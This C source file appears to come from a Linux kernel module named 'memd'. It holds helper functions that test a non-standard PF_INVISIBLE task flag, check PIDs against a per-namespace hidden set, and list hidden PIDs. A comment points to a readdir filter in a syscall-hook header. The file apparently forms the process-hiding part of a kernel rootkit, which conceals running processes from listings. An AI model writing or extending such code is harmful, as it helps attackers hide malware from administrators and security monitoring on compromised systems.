#include "memd_proc.h"
#include "memd_hide.h"

#include <linux/rcupdate.h>

int is_invisible(pid_t pid) {
    struct task_struct* task;
    int ret;
    if (!pid)
        return 0;
    /* find_task_by_vpid requires RCU read lock; the task pointer must
     * not be touched outside it (no ref taken). */
    rcu_read_lock();
    task = find_task_by_vpid(pid);
    ret = (task && (task->flags & PF_INVISIBLE)) ? 1 : 0;
    rcu_read_unlock();
    return ret;
}

bool memd_hide_check_visibility(pid_t pid, struct pid_namespace *ns)
 {
    /* NULL ns keeps the historical &init_pid_ns default: this helper
     * stays init-scoped on purpose (backward compat). Non-init
     * reader-plane callers must pass the reader's active ns
     * explicitly; the readdir filter already does (see
     * memd_syshook.h), so no change is needed here. */
    if (!ns)
        ns = &init_pid_ns;
    return memd_hide_contains_ns(pid, ns);
}

int memd_hide_get_hidden_pids(pid_t *buf, size_t buf_size, size_t *count)
 {
    return memd_hide_collect_pids(buf, buf_size, count, NULL);
}

int memd_hide_get_ns_hidden_pids(pid_t *buf, size_t buf_size, size_t *count, struct pid_namespace *ns)
 {
    if (!ns)
        return -EINVAL;
    return memd_hide_collect_pids(buf, buf_size, count, ns);
}
/* kmod/memd/proc/memd_proc.c[∂] */
